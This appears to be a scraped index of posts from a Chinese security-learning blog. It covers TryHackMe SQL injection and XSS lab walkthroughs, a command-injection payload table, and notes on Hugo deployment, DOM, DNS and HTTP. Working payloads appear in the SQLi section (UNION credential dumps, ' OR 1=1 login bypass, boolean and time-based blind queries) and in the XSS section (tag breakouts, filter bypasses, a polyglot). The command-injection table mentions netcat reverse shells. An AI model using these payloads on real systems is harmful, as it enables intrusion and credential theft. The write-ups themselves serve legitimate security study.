name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;\nINSERT INSERT 语句告诉数据库我们希望在表中插入一行新数据。 “into users” 告诉数据库我们希望将数据插入到哪个表中， “（username，password）” 提供我们提供数据的列，然后 “values （\u0026lsquo;bob\u0026rsquo;，\u0026lsquo;password\u0026rsquo;）”; 提供以前指定的列的数据。\ninsert into users (username,password) values ('bob','password123');\nUPDATE UPDATE 语句告诉数据库我们希望更新表中的一行或多行数据。您使用 “update %tablename% SET” 指定要更新的表，然后选择要更新的一个或多个字段，以逗号分隔的列表，例如 “username=\u0026lsquo;root\u0026rsquo;，password=\u0026lsquo;pass123\u0026rsquo;”，最后，类似于 SELECT 语句，您可以使用 where 子句准确指定要更新的行，例如 “where username=\u0026lsquo;admin;“\nupdate users SET username='root',password='pass123' where username='admin';\nDELETE DELETE 语句告诉数据库我们希望删除一行或多行数据。除了缺少要返回的列之外，此查询的格式与 SELECT 非常相似。您可以使用 where 子句精确指定要删除的数据，并使用 LIMIT 子句指定要删除的行 数。\ndelete from users where username='martin';\ndelete from users;\n由于查询中未使用 WHERE 子句，因此所有数据都已从表中删除。\n基础做题 In-Band SQL Injection 查询库 利用union查询的原理，先确定回显的位置。\n构建 0 UNION SELECT 1,2,3\n可以看到页面情况，有三个回显位置\n构建 0 UNION SELECT 1,2,database()\n可以知道database的名字：sqli_one\n查询表 构建 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'\n在此查询中，需要学习一些新内容。首先，方法 group_concat（） 从多个返回的行中获取指定的列（在我们的例子中为 table_name），并将其放入一个以逗号分隔的字符串中。接下来是 information_schema 数据库;数据库的每个用户都可以访问它，它包含有关该用户有权访问的所有数据库和表的信息。在这个特定的查询中，我们有兴趣列出 sqli_one 数据库中的所有 表，即 article 和 staff_users。\n由于第一级旨在发现 Martin 的密码，因此 staff_users 表是我们感兴趣的。我们可以再次利用 information_schema 数据库，通过以下查询找到此表的结构。\n0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'\n这与前面的 SQL 查询类似。但是，我们要检索的信息已从 table_name 更改为 column_name，我们在 information_schema 数据库中查询的表已从 tables 更改为 columns，并且我们正在搜索 table_name 列值为 staff_users 的任何行\n查询结果为 staff_users 表提供三列：id、password 和 username。我们可以使用以下查询的 username 和 password 列来检索用户的信息。\n0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '\u0026lt;br\u0026gt;') FROM staff_users\n同样，我们使用 group_concat 方法将所有行返回到一个字符串中，使其 更易于阅读。我们还添加了 ，\u0026rsquo;：\u0026rsquo;， 以将用户名和密码彼此分开。我们没有用逗号分隔，而是选择了 HTML \u0026lt;br\u0026gt; 标签，该标签强制每个结果位于单独的行上，以便于阅读。\n身份认证绕过盲注 与带内 SQL 注入不同，我们可以直接在屏幕上看到攻击的结果，而盲 SQLi 是指我们几乎没有收到反馈来确认我们注入的查询是否真的成功，这是因为错误消息已被禁用，但无论如何注入仍然有效。您可能会感到惊讶，我们只需要一点点反馈即可成功枚举整个数据库。\n最直接的盲 SQL 注入技术之一是绕过身份验证方法，例如登录表单。在这种情况下，我们对从数据库中检索数据并不那么感兴趣;我们只想通过登录。\n连接到用户数据库的登录表单的开发方式通常使 Web 应用程序对用户名和密码的内容不感兴趣，而更关心两者是否在 users 表中形成匹配的对。简单来说，Web 应用程序会询问数据库，“您有用户名为 bob 的用户，密码为 bob123 吗？ 数据库回答 Yes 或 No （true/false），并且根据该答案，指示 Web 应用程序是否允许您继续。\n考虑到上述信息，没有必要枚举有效的用户名/密码对。我们只需要创建一个以 yes/true 回复的数据库查询。\n实际： SQL 注入示例的第二级显示了这个确切的示例。我们可以在标有 “SQL Query” 的框中看到，对数据库的查询如下：\nselect * from users where username='%username%' and password='%password%' LIMIT 1;\n注意：%username% 和 %password% 值取自登录表单字段。SQL Query （SQL 查询） 框中的初始值将为空，因为这些字段当前为空。\n要将其转换为始终返回 true 的查询，我们可以在 password 字段中输入以下内容：\n' OR 1=1;--\n这会将 SQL 查询转换为以下内容：\nselect * from users where username='' and password='' OR 1=1;\n因为 1=1 是 true 语句，并且我们使用了 OR 运算符，所以这将始终导致查询返回 true，这满足 Web 应用程序逻辑，即数据库找到了有效的用户名/密码组合，并且应该允许访问。\n基于布尔盲注 基于布尔值的 SQL 注入是指我们从注入尝试中收到的响应，可以是 true/false、yes/no、on/off、1/0 或任何只能有两个结果的响应。该结果确认了我们的 SQL Injection payload 成功或失败。在第一次检查时，您可能会觉得这种有限的回答无法提供太多信息。不过，仅通过这两个响应，就可以枚举整个数据库结构和内容。\n实际： 览器正文包含 {“taken”：true}。此 API 端点复制了许多订阅表单上的常见功能，该功能检查用户名是否已注册，以提示用户选择不同的用户名。 由于 taken 的值设置为 true，因此我们可以假设用户名 admin 已注册。我们可以通过将模拟浏览器地址栏中的用户名从 admin 更改为 admin123 来确认这一点，按下 Enter 键后，你会看到所采用的值 现在已更改为 false\nselect * from users where username = '%username%' LIMIT 1;\n我们唯一可以控制的输入是查询字符串中的用户名，我们必须使用它来执行 SQL 注入。将用户名保持为 admin123，我们可以开始附加到此内容以尝试使数据库确认 true 内容，将 taken 字段的状态从 false 更改为 true。\n与前面的级别一样，我们的第一个任务是建立 users\u0026rsquo; 表中的列数，这可以通过使用 UNION 语句来实现。将 username 值更改为以下内容：\nadmin123' UNION SELECT 1;-- 由于 Web 应用程序已使用取为 false 的值 进行响应，因此我们可以确认这是不正确的列值。 继续添加更多列，直到我们得到 true 的 taken 值 。您可以通过将 username 设置为以下值来确认答案为三列：\nadmin123' UNION SELECT 1,2,3;-- 在我们已经确定了列数，我们可以进行数据库的枚举。我们的第一个任务是发现数据库名称。我们可以通过使用内置的 database（） 方法，然后使用 like 运算符来尝试查找将返回 true 状态的结果。\n尝试以下 username 值，看看会发生什么：\nadmin123' UNION SELECT 1,2,3 where database() like '%';--\n我们得到一个 true 响应，因为在 like 运算符中，我们只有 % 的值 ，它将匹配任何内容，因为它是通配符值。如果我们将通配符运算符更改为 **a%，**您将看到响应返回 false，这确认数据库名称不以字母 a 开头。我们可以循环遍历所有字母、数字和字符，例如 - 和 _，直到找到匹配项。如果您将以下内容作为 username 值发送，您将收到一个 true 响应，确认数据库名称以字母 s 开头\nadmin123' UNION SELECT 1,2,3 where database() like 's%';--\n现在，您继续 数据库名称的下一个字符，直到找到另一个真实的响应，例如，\u0026lsquo;sa%\u0026rsquo;、\u0026lsquo;sb%\u0026rsquo;、\u0026lsquo;sc%\u0026rsquo; 等。继续此过程，直到发现数据库名称的所有字符，即 sqli_three\n我们已经建立了数据库名称，现在我们可以通过使用 information_schema 数据库使用类似的方法使用它来枚举表名。尝试将 username 设置为以下值：\nadmin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--\n此查询在 tables 表中的 information_schema 数据库中 查找数据库名称与 sqli_three 匹配 且表名称以字母 a 开头的结果。 由于上述查询导致 false 响应，我们可以确认 sqli_three 数据库中没有以字母 a 开头的表。和以前一样，您需要在字母、数字和字符之间循环，直到找到正匹配项。\n您最终会在 sqli_three 数据库中发现一个名为 users 的表，您可以通过运行以下 username payload 来确认该表：\nadmin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--\n最后，我们现在需要枚举 users 表中的列名 ，以便我们可以正确地搜索登录凭据。 同样，我们可以使用 information_schema 数据库和我们已经获得的信息来查询它的列名。使用下面的有效负载，我们搜索 columns 表，其中 database 等于 sqli_three，表名称为 users，列名称以字母 a 开头。\nadmin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';\n同样， 您需要在字母、数字和字符之间循环，直到找到匹配项。由于您要查找多个结果，因此每次找到新的列名称时，都必须将其添加到有效负载中，以避免发现相同的结果。例如，找到名为 id 的列后，将其附加到原始有效负载中（如下所示）。\nadmin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';\n重复此过程 3 次，您将发现列的 ID、用户名和密码。现在，您可以使用它来查询 users 表以获取登录凭据。首先，您需要找到一个有效的用户名，您可以使用下面的有效负载：\nadmin123' UNION SELECT 1,2,3 from users where username like 'a%\nadmin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%\n基于时间的盲注 基于时间的盲目 SQL 注入与上述基于 布尔值的盲注非常相似，因为发送的请求相同，但这次没有明显的查询是错还是对的指示。相反，正确查询的指标基于查询完成所需的时间。此时间延迟是使用内置方法（如 SLEEP（x） 和 UNION 语句引入的。SLEEP（） 方法只会在成功的 UNION SELECT 语句后执行。\n实际： 因此，例如，在尝试建立表中的列数时，您将使用以下查询：\nadmin123' UNION SELECT SLEEP(5);--\n如果响应时间没有暂停，则我们知道查询不成功，因此与之前的任务一样，我们添加另一列：\nadmin123' UNION SELECT SLEEP(5),2;--\n有效负载应产生 5 秒的延迟，确认 UNION 语句成功执行，并且有两列。\n按照布尔盲注的步骤，只是更改一下前面的语句，要改成sleep()形式\n最后得到admin：4961\n","date":"2025-03-18T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/73aeab67fb4786d5331bab4f3b2452827dba9d186069cdc60db0ecfab89b34c5.png","permalink":"https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","title":"SQL注入基础"},{"content":"XSS THM 做题记录 Level One: 看到一个表单，要您输入的姓名，输入姓名后，该表单将在下面的一行中显示，例如：\n如果查看 Page Source，将看到姓名反映在代码中：\n我们将尝试输入以下 JavaScript Payload，而不是输入姓名： \u0026lt;script\u0026gt;alert('THM');\u0026lt;/script\u0026gt;\n现在，当单击输入按钮时，将收到一个带有字符串 THM 的警报弹出窗口，页面源代码将如下所示：\nLevel Two： 与上一个级别一样，系统将再次要求您输入的姓名。这一次，当单击 enter 时，姓名将反映在 input 标签中：\n查看页面源，可以看到姓名反映在 input 标签的 value 属性中：\n如果要尝试前面的 JavaScript 有效负载，它将不起作用，因为无法从 input 标签内部运行它。相反，我们需要先转义 input 标签，以便 payload 可以正常运行。可以使用以下有效负载执行此作：\n\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert('THM');\u0026lt;/script\u0026gt;\n有效负载的重要部分是“\u0026gt;”，它关闭 value 参数，然后关闭 input 标记。\n现在，这会正确关闭 input 标记并允许 JavaScript 有效负载运行：\nLevel Three: 看到另一个表单，询问名字，与上一级一样，名字会反映在 HTML 标签中，这次是 textarea 标签。\n我们必须使用以下有效负载，以略微不同的方式转义 textarea 标签和输入 1（在 Level Two 中）：\n\u0026lt;/textarea\u0026gt;\u0026lt;script\u0026gt;alert('THM');\u0026lt;/script\u0026gt;\n上述有效负载的重要部分是 \u0026lt;/textarea\u0026gt;，它会导致 textarea 元素关闭，以便脚本运行。\nLevel Four: 在表单中输入姓名，会在页面上看到它。此级别看起来类似于 1 级，但在检查页面源代码时，会看到名字反映在一些 JavaScript 代码中。\n必须转义现有的 JavaScript 命令，以便能够运行代码;可以使用以下有效负载 ';alert（'THM'）;// 从下面的屏幕截图中可以看到，它将执行代码。' 关闭指定名称的字段，然后 ;表示当前命令的结束，末尾的 则``使它后面的任何内容成为注释，而不是可执行代码。\nLevel Five: 现在，此级别看起来与级别 1 相同，并且名字也会反映在同一个位置。但是，如果尝试有效负载 \u0026lt;script\u0026gt;alert('THM');\u0026lt;/script\u0026gt; ，它将不起作用。当查看页面源代码时，将了解原因。\nscript 会从有效负载中删除，这是因为有一个过滤器可以去除任何具有潜在危险的单词。\n当一个单词从字符串中删除时，你可以尝试一个有用的技巧。\n尝试输入有效负载 \u0026lt;sscriptcript\u0026gt;alert('THM');\u0026lt;/sscriptcript\u0026gt; 并单击输入按钮，将看到一个带有字符串 THM 的警报弹出窗口。\nLevel Six: 与第二级类似，我们必须从 input 标签的 value 属性中转义，我们可以尝试 \u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert('THM');\u0026lt;/script\u0026gt; ，但这似乎不起作用。让我们检查一下页面源代码，看看为什么这不起作用。\n可以看到 \u0026lt; 和 \u0026gt; 字符从我们的 payload 中被过滤掉，从而阻止我们转义 IMG 标签。为了绕过过滤器，我们可以利用 IMG 标签的其他属性，比如 onload 事件。onload 事件将在 src 属性中指定的图像加载到网页后执行您选择的代码。\n让我们更改 payload 以反映这一点 /images/cat.jpg\u0026quot; onload=\u0026quot;alert('THM'); ，然后查看页面源，您将看到这将如何工作。\nPolyglots: XSS 多语言是一串文本，可以一站式转义属性、标签和绕过过滤器。可以在刚刚完成的所有 6 个级别上使用以下多语言，并且它会成功执行代码。\n1 jaVasCript:/*-/*`/*\\`/*\u0026#39;/*\u0026#34;/**/(/* */onerror=alert(\u0026#39;THM\u0026#39;) )//%0D%0A%0d%0a//\u0026lt;/stYle/\u0026lt;/titLe/\u0026lt;/teXtarEa/\u0026lt;/scRipt/--!\u0026gt;\\x3csVg/\u0026lt;sVg/oNloAd=alert(\u0026#39;THM\u0026#39;)//\u0026gt;\\x3e ","date":"2025-03-18T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/b700481cd7430f01667bb498798f40d218f0b35bb085b3ffa989e042ad5542a1.png","permalink":"https://Yerucrem.github.io/p/xss-1/","title":"XSS-1"},{"content":"自动部署 参考 【Hugo】Hugo + Github 免费部署自己的博客\n均在dev文件夹下\n首次部署 1 2 3 4 5 6 git init git add . git commit -m \u0026#34;first commit\u0026#34; git branch -M main git remote add origin {你的github仓库地址} git push -u origin main 试运行 1 2 hugo server -D ctrl + c [停止运行] 更新 在dev目录下\n1 2 3 4 5 git init git add . git commit -m \u0026#34;update\u0026#34; git branch -M main git push ","date":"2025-03-18T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/d67014b38a1cd68b40e838a207152f5a77ecfc8a2e40c3d56b538fa48de38080.png","permalink":"https://Yerucrem.github.io/p/%E5%88%A9%E7%94%A8github%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/","title":"利用github实现自动部署"},{"content":"命令注入 分类 命令注入主要可以通过以下两种方式之一进行检测：\n盲命令注入 详细命令注入 方法 描述 盲 这种类型的注入是在测试有效负载时应用程序没有直接输出的地方。您必须调查应用程序的行为，以确定您的有效负载是否成功。 详细 这种类型的注入是测试有效负载后从应用程序获得直接反馈的地方。例如，运行 whoami 命令以查看应用程序在哪个用户下运行。Web 应用程序将直接在页面上输出用户名。 有用的有效载荷 Linux 有效载荷 描述 whoami 查看应用程序在哪个用户下运行。 ls 列出当前目录的内容。您也许能够找到配置文件、环境文件（令牌和应用程序密钥）等文件，以及更多有价值的内容。 ping 此命令将调用应用程序以挂起。这在测试应用程序是否进行盲命令注入时非常有用。 sleep 这是测试应用程序盲目命令注入时的另一个有用有效负载，其中计算机未安装 ping。 nc Netcat 可用于在易受攻击的应用程序上生成反向 shell。您可以使用此立足点在目标计算机上导航，以获取其他服务、文件或提升权限的潜在方法。 windows 有效载荷 描述 whoami 查看应用程序在哪个用户下运行。 dir 列出当前目录的内容。您也许能够找到配置文件、环境文件（令牌和应用程序密钥）等文件，以及更多有价值的内容。 ping 此命令将调用应用程序以挂起。这在测试应用程序是否进行盲命令注入时非常有用。 timeout 此命令还将调用应用程序以挂起。如果未安装 ping 命令，则它还可用于测试应用程序是否进行盲命令注入。 ","date":"2025-03-18T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/f11677927824a3d078e08a2c300d8ccf225d496d442a2b7c8be0ca2d5adf6d9a.png","permalink":"https://Yerucrem.github.io/p/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-1/","title":"命令注入-1"},{"content":"DOM Document Object Model 文档对象模型\n什么是文档对象模型？ \u0026mdash; What is the Document Object Model?\nDOM 是什么？ 想象一下，你有一张房子的建筑蓝图，上面画着房子的每一个部分：墙、门、窗户、屋顶等等。DOM 就像是网页的“蓝图”。当你打开一个网页，浏览器会把网页的 HTML 代码（那些 \u0026lt;html\u0026gt;、\u0026lt;div\u0026gt;、\u0026lt;p\u0026gt; 标签）解析成一个树状结构，这个结构就是 DOM。它把网页里的每一个元素（比如标题、段落、图片）都整理得清清楚楚，让计算机（特别是 JavaScript）能找到它们、操作它们。\n简单来说，DOM 是网页的骨架图，它把网页的内容变成一个个“节点”（node），这些节点就像蓝图上的标记点，互相之间还有父子关系、兄弟关系，形成一个大树。\n1 2 3 4 5 6 7 8 9 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;我的网页\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;欢迎\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;这是一个段落。\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 在这个 HTML 里，DOM 会把它变成一个树形结构：\n1 2 3 4 5 6 7 8 9 - \u0026lt;html\u0026gt; 是根节点，就像树的树根，整个网页的起点。 - \u0026lt;html\u0026gt; 下面有两个“孩子”：\u0026lt;head\u0026gt; 和 \u0026lt;body\u0026gt;。 - \u0026lt;head\u0026gt; 里有个孩子 \u0026lt;title\u0026gt;，它的内容是“我的网页”。 - \u0026lt;body\u0026gt; 里有两个孩子：\u0026lt;h1\u0026gt;（内容是“欢迎”）和 \u0026lt;p\u0026gt;（内容是“这是一个段落。”）。 这就像一个家庭的家谱：\u0026lt;html\u0026gt; 是爷爷，\u0026lt;head\u0026gt; 和 \u0026lt;body\u0026gt; 是他的两个孩子，\u0026lt;title\u0026gt; 是 \u0026lt;head\u0026gt; 的孩子，\u0026lt;h1\u0026gt; 和 \u0026lt;p\u0026gt; 是 \u0026lt;body\u0026gt; 的孩子。每个节点都是一个“对象”，有自己的属性，比如 \u0026lt;p\u0026gt; 的 innerHTML 属性就是“这是一个段落。”。 DOM 有什么用？ DOM 的牛逼之处在于，它让 JavaScript 能和网页互动。有了 DOM，JavaScript 就像一个装修工人，可以拿着网页的蓝图（DOM）去干活：\n查看：找到某个节点，看看它是什么内容。 修改：比如把 \u0026lt;p\u0026gt; 的文字从“这是一个段落。”改成“这是新段落！”。 添加：在 \u0026lt;body\u0026gt; 里加一个新的 \u0026lt;p\u0026gt; 节点。 删除：把某个节点去掉。 举个例子：你想做一个网页，用户点一个按钮，页面上的文字就变了。你可以用 JavaScript 写代码，通过 DOM 找到那个文字所在的节点，然后改它的内容。比如：\n1 找到 \u0026lt;p\u0026gt; 节点 let paragraph = document.querySelector(\u0026#34;p\u0026#34;); // 修改它的内容 paragraph.innerHTML = \u0026#34;文字被我改啦！\u0026#34;; 再比如，你想做一个待办事项列表，用户点按钮就能添加新任务。这也是通过 DOM 实现的：JavaScript 创建一个新节点（比如 \u0026lt;li\u0026gt;），然后把它加到列表里。\nDOM 是桥梁 所以，DOM 就像是网页（HTML）和 JavaScript 之间的“翻译官”或者“桥梁”。HTML 负责写出网页的内容和结构，DOM 把这些内容变成一个树形结构，JavaScript 通过 DOM 来动态地控制网页，让网页不再是静态的，而是可以互动、有变化的。\n小结 用最简单的话说：\nDOM 是网页的树形蓝图，把每个元素都变成节点。 JavaScript 通过 DOM 操作网页，可以改内容、加东西、删东西。 它让网页变得活起来，能根据用户的操作动态变化。 ","date":"2025-02-18T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/f4a6e2d065c3c9fcd40dfb76bc3317b0d466b12c787faa354faa62457ded2ba5.png","permalink":"https://Yerucrem.github.io/p/dom-%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B/","title":"DOM 文档对象模型"},{"content":"DNS详细信息 DNS（域名系统）为我们提供了一种与 Internet 上的设备进行通信的简单方法，而无需记住复数。就像每栋房子都有一个直接向其发送邮件的唯一地址一样，互联网上的每台计算机都有自己唯一的地址来与之通信，称为 IP 地址。IP 地址类似于以下 104.26.10.229,4 组数字，范围从 0 到 255，用句点分隔。当您想访问一个网站时，记住这组复杂的数字并不十分方便，而这正是 DNS 可以提供帮助的地方。因此，您可以记住 tryhackme.com，而不是记住 104.26.10.229。\n域层次结构 TLD （顶级域名） TLD 是域名最右侧的部分。因此，例如，tryhackme.com TLD 是 .com。TLD 有两种类型，gTLD（通用顶级域名）和 ccTLD（国家代码顶级域名）。从历史上看，gTLD 旨在告诉用户域名的用途;例如，.com 用于商业目的，.org 用于组织，.edu 用于教育，.gov 用于政府。ccTLD 用于地理目的，例如 .ca 表示位于加拿大的站点，.co.uk 表示位于英国的站点，依此类推。由于这种需求，涌入了从 .online 、 .club 、 .website 、 .biz 等 新 gTLD 。\n二级域 以 tryhackme.com 为例，.com部分是 TLD，tryhackme 是二级域名。注册域名时，二级域名限制为 63 个字符 + TLD，并且只能使用 a-z 0-9 和连字符（不能以连字符开头或结尾或有连续的连字符）。\n子域 子域位于二级域的左侧，使用句点分隔它;例如，在 name admin.tryhackme.com 中，admin 部分是 subdomain。子域名的创建限制与二级域名相同，限制为 63 个字符，并且只能使用 a-z 0-9 和连字符（不能以连字符开头或结尾，也不能有连续的连字符）。您可以使用多个子域（用句点拆分）来创建更长的名称，例如 jupiter.servers.tryhackme.com。但长度必须保持在 253 个字符或更少。您可以为域名创建的子域数量没有限制。\n","date":"2025-01-08T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/background07.jpg","permalink":"https://Yerucrem.github.io/p/dns-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/","title":"DNS 详细信息"},{"content":"HTTP协议 什么是 HTTP？（超文本传输协议） HTTP 是您查看网站时使用的工具，由 Tim Berners-Lee 和他的团队在 1989 年至 1991 年间开发。HTTP 是用于与 Web 服务器通信以传输网页数据（无论是 HTML、图像、视频等）的规则集。\n什么是 HTTPS？ （安全超文本传输协议） HTTPS 是 HTTP 的安全版本。 HTTPS 数据是加密的，因此它不仅可以阻止人们看到您接收和发送的数据，还可以确保您正在与正确的 Web 服务器通信，而不是冒充它。\n什么是 URL？（统一资源定位器） 如果您曾经使用过 Internet，那么您以前也使用过 URL。URL 主要是有关如何访问 Internet 上的资源的指令。下图显示了 URL 及其所有功能的外观（它不会在每个请求中使用所有功能）。\nScheme:这指示使用什么协议来访问资源，例如 HTTP、HTTPS、FTP（文件传输协议）。 **User:**某些服务需要身份验证才能登录，您可以在 URL 中输入用户名和密码才能登录。 **Host:**您要访问的服务器的域名或 IP 地址。 **Port:**您要连接的端口，通常为 80 用于 HTTP，443 用于 HTTPS，但这可以托管在 1 - 65535 之间的任何端口上。 **Path:**您尝试访问的资源的文件名或位置。 **Query String:**可以发送到请求路径的额外信息位。例如，/blog？id=1 将告知博客路径您希望接收 ID 为 1 的博客文章。 Fragment: 这是对请求的实际页面上的位置的引用。这通常用于内容较长的页面，并且可以将页面的某个部分直接链接到该页面，因此用户一旦访问该页面即可查看该页面。 提出请求 只需一行 GET / HTTP/1.1 就可以向 Web 服务器发出请求\n但要获得更丰富的 Web 体验，您还需要发送其他数据。这些其他数据以所谓的 headers 形式发送，其中 header 包含额外的信息，以提供给您正在与之通信的 Web 服务器，但我们将在 Header 任务中对此进行更多介绍。\n请求示例：\n1 2 3 4 5 6 7 8 9 10 GET / HTTP/1.1 Host: tryhackme.com User-Agent: Mozilla/5.0 Firefox/87.0 Referer: https://tryhackme.com/ 第 1 行： 此请求将发送 GET 方法（ 在 HTTP 方法 任务中，有更多相关信息），请求带有 / 的主页，并告知 Web 服务器我们使用的是 HTTP 协议版本 1.1。\n第 2 行： 我们告诉 Web 服务器我们希望网站 tryhackme.com\n第 3 行： 我们告诉 Web 服务器我们使用的是 Firefox 版本 87 浏览器\n第 4 行： 我们告诉 Web 服务器，将我们引荐到此网页的网页是 https://tryhackme.com\n**第 5 行：**HTTP 请求始终以空行结尾，以通知 Web 服务器请求已完成。\n响应示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 HTTP/1.1 200 OK Server: nginx/1.15.8 Date: Fri, 09 Apr 2021 13:34:03 GMT Content-Type: text/html Content-Length: 98 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;TryHackMe\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; Welcome To TryHackMe.com \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 第 1 行： HTTP 1.1 是服务器正在使用的 HTTP 协议版本，然后是 HTTP 状态代码（在本例中为“200 Ok”），这告诉我们请求已成功完成。\n第 2 行： 这告诉我们 Web 服务器软件和版本号。\n第 3 行： Web 服务器的当前日期、时间和时区。\n第 4 行： Content-Type 标头告诉客户端将发送哪种信息，例如 HTML、图像、视频、pdf、XML。\n第 5 行： Content-Length 告诉客户端响应多长时间，这样我们就可以确认没有丢失数据\n**第 6 行：**HTTP 响应包含一个空行，用于确认 HTTP 响应的结束。\n第 7-14 行： 已请求的信息，在本例中为主页。\nHTTP方法 GET Request 这用于从 Web 服务器获取信息。\nPOST Request 这用于将数据提交到 Web 服务器并可能创建新记录\nPUT Request 这用于将数据提交到 Web 服务器以更新信息\nDELETE Request 这用于从 Web 服务器中删除信息/记录。\nHTTP 协议状态代码： 在上一个任务中，您了解到，当 HTTP 服务器响应时，第一行始终包含一个状态代码，告知客户端其请求的结果以及可能如何处理该请求。这些状态代码可以分为 5 个不同的范围：\n100-199 - Information Response 100-199 - 信息响应 发送这些请求是为了告诉客户端其请求的第一部分已被接受，他们应该继续发送请求的其余部分。这些代码不再很常见。 200-299 - 成功 此状态代码范围用于告诉客户端其请求成功。 300-399 - 重定向 这些用于将客户端的请求重定向到另一个资源。这可以是不同的网页，也可以是完全不同的网站。 400-499 - Client Errors 400-499 - 客户端错误 用于通知客户端其请求有错误。 500-599 - 服务器错误 这是为服务器端发生的错误保留的，通常表示处理请求的服务器存在相当大的问题。 常见的 HTTP 状态代码： 有很多不同的 HTTP 状态代码，这还不包括应用程序甚至可以定义自己的 HTTP 状态代码，我们将介绍您可能遇到的最常见的 HTTP 响应：\n200 - OK 200 - 正常 请求已成功完成。 201 - Created 201 - 已创建 已创建资源（例如，新用户或新博客文章）。 301 - Moved Permanently 301 - 永久移动 这会将客户的浏览器重定向到新网页，或告诉搜索引擎该页面已移至其他位置并改为查看那里。 302 - Found 302 - 找到 与上述永久重定向类似，但顾名思义，这只是一个临时更改，在不久的将来可能会再次更改。 400 - Bad Request 400 - 错误请求 这会告诉浏览器他们的请求中有错误或缺失。如果请求的 Web 服务器资源需要客户端未发送的特定参数，则有时可以使用此方法。 401 - Not Authorised 401 - 未授权 在您授权 Web 应用程序（通常是使用用户名和密码）之前，您当前不允许查看此资源。 403 - Forbidden 403 - 禁止 无论您是否登录，您都无权查看此资源。 405 - Method Not Allowed 405 - 不允许使用 资源不允许此方法请求，例如，当资源需要 POST 请求时，您向资源 /create-account 发送 GET 请求。 404 - Page Not Found 404 - 未找到页面 您请求的页面/资源不存在。 500 - Internal Service Error 500 - 内部服务错误 服务器在您的请求中遇到了某种错误，它不知道如何正确处理。 503 - Service Unavailable 503 - 服务不可用 此服务器无法处理您的请求，因为它已过载或停机进行维护。 Headers 头 标头是您在发出请求时可以发送到 Web 服务器的附加数据位。\n尽管在发出 HTTP 请求时不严格要求标头，但您会发现很难正确查看网站。\n通用请求标头 这些是从客户端（通常是您的浏览器）发送到服务器的标头。\nHost: 一些 Web 服务器托管多个网站，因此通过提供主机标头，您可以告诉它您需要哪个网站，否则您只会收到服务器的默认网站。\n**User-Agent:**这是您的浏览器软件和版本号，告诉 Web 服务器您的浏览器软件有助于它为您的浏览器正确格式化网站，并且 HTML、JavaScript 和 CSS 的某些元素仅在某些浏览器中可用。\n**Content-Length:**将数据发送到 Web 服务器（例如在表单中）时，内容长度会告知 Web 服务器 Web 请求中预期有多少数据。这样，服务器可以确保它不会丢失任何数据。\n**Accept-Encoding:**告诉 Web 服务器浏览器支持哪些类型的压缩方法，以便可以缩小数据以通过 Internet 传输。\n**Cookie:**发送到服务器以帮助记住您的信息的数据（有关更多信息，请参阅 Cookie 任务）。\n常见响应标头 这些是在请求后从服务器返回给客户端的标头。\n**Set-Cookie:**要存储的信息将在每个请求中发送回 Web 服务器（请参阅 cookie 任务以了解更多信息）。\n**Cache-Control:**在浏览器再次请求响应之前，将响应内容存储在浏览器的缓存中多长时间。\nContent-Type: 这会告诉客户端返回什么类型的数据，即 HTML、CSS、JavaScript、图像、PDF、视频等。使用 content-type 标头，浏览器就可以知道如何处理数据。\n**Content-Encoding:**通过 Internet 发送数据时，使用了什么方法来压缩数据以使其更小。\nCookies 它们只是存储在您计算机上的一小段数据。当您从 Web 服务器收到 “Set-Cookie” 标头时，将保存 Cookie。然后，您发出的每个进一步请求，您都会将 cookie 数据发送回 Web 服务器。由于 HTTP 是无状态的（不会跟踪您以前的请求），因此 cookie 可用于提醒 Web 服务器您是谁、网站的一些个人设置或您以前是否访问过该网站。让我们看一下这个 HTTP 请求示例：\nCookie 可用于多种用途，但最常用于网站身份验证。cookie 值通常不是您可以看到密码的明文字符串，而是令牌（人类不容易猜到的唯一密码）。\n查看您的 Cookie 您可以在浏览器中使用开发人员工具轻松查看浏览器向网站发送的 